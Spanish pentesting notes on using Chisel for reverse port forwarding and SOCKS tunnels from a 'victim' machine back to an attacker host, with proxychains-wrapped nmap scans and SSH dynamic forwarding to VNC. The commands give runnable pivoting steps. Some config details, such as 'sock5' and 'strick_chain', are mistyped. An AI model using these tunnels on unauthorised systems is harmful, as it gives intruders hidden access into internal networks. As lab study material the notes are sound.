## Chisel 

Tags: #Chisel #PortForwarding #LocalForwarding #DinamicForwarding 

#### Local Port Forwarding 
Nos permite redirigir todo el trafico entrante de un puerto local hacia un puerto remoto.
Server -> Windows 
Cliente -> Kali

1. Podemos clonarlo a nuestra maquina victima 
```bash
❯ git clone https://github.com/jpillora/chisel       # Nos descargamos el Chisel
```

Dentro de Chisel 
```bash
❯ go build -ldflags “-s -w” .                        # Nos ayudara a reducir el tamaño del compilado 
❯ upx Chisel                                         # Para reducir aun mas el tamaño
```

2. Podemos descargarlo directamente desde la pagina 
* [Chisel](https://github.com/jpillora/chisel)    ->    'Web Page > releases > chisel_1.8.1_linux_amd64.gz'

3. Debemos transferirlo a la maquina victima mediante un servidor HTTP 

4. Lo ejecutamos de la siguiente manera 
* De esta manera nos podemos traer un puerto especifico
```bash
❯ ./chisel server --reverse -p 1234                                                 # Server 'Maquina de atacante'
❯ ./chisel client <IP-Server>:1234 R:<Port-Local-a-Abrir>:<IP-Local>:<Port-Traemos> # Cliente 'Maquina victima'

	# R = Remote Port Forwarding
	# IP-Server = IP de la maquina atacante
	# Port-Server = Puerto de la maquina atacante
	# Port-Local = Puerto que vamos a traer de la maquina victima
	# IP-Local = IP del Localhost de la maquina victima 
	# Port-Traemos = Puerto que vamos a abrir en nuestra maquina
```

* De esta manera nos crea un túnel desde la maquina de atacante hacia la maquina victima
```bash
❯ ./chisel server --reverse -p 1234                                             # Server 'Maquina de atacante'
❯ ./chisel client <IP-Server>:1234 R:socks                                      # Cliente 'Maquina victima'

	# R = Remote Port Forwarding
	# IP-Server = IP de la maquina atacante
	# Port-Server = Puerto de la maquina atacante
     # socks = Abre el puerto 1080 de nuestra de atacante y nos crea un tunel para llegar a la maquina victima 
```

Debemos de hacer los siguientes cambios después de crear el túnel 
```bash 
❯ nano /etc/proxychains.conf 

# Comentamos el Dinamic_chain, este solo se habilita cuando vamos pasando por varios tuneles
# Activamos el strick_chain, este solo es cuando tenemos un tunel 
# Hasta abajo del archivo agregamos lo siguiente:

sock5 127.0.0.1 1080 
```

Forma de verificar 
```bash 
❯ proxychains nmap -sT -Pn -p- -open -T5 -v -n ❮Target IP❯ 2>/dev/null      # Proxychains nos ayudara a que el comando pase por el tunel creado por chisel 
```


#### Dinamic Port Forwarding 

Modificaremos:
```bash
❯ nano /etc/proxychains.conf                            # Modificaremo este archivo en nuestra maquina
	socks4 127.0.0.1 1080                              # Haremos que la conexion para nuestra maquina se efectue en el puerto 1080
```

```bash
❯ ssh < user>@< IP> -D 1080                             # Para conectarnos por ssh (D=Dinamic Port Forwarding) y colocamos el puerto que anteriormente habiamos configurado.
❯ proxychains vncviewer -passwd secret 127.0.0.1:5901   # Nos conectamos por vncviewer y nos arrojara el cuadro remoto de la conexion (5901=puerto remoto expuesto en la maquina victima)

	# secret -> Archivo que contiene la passwd para la conexion
```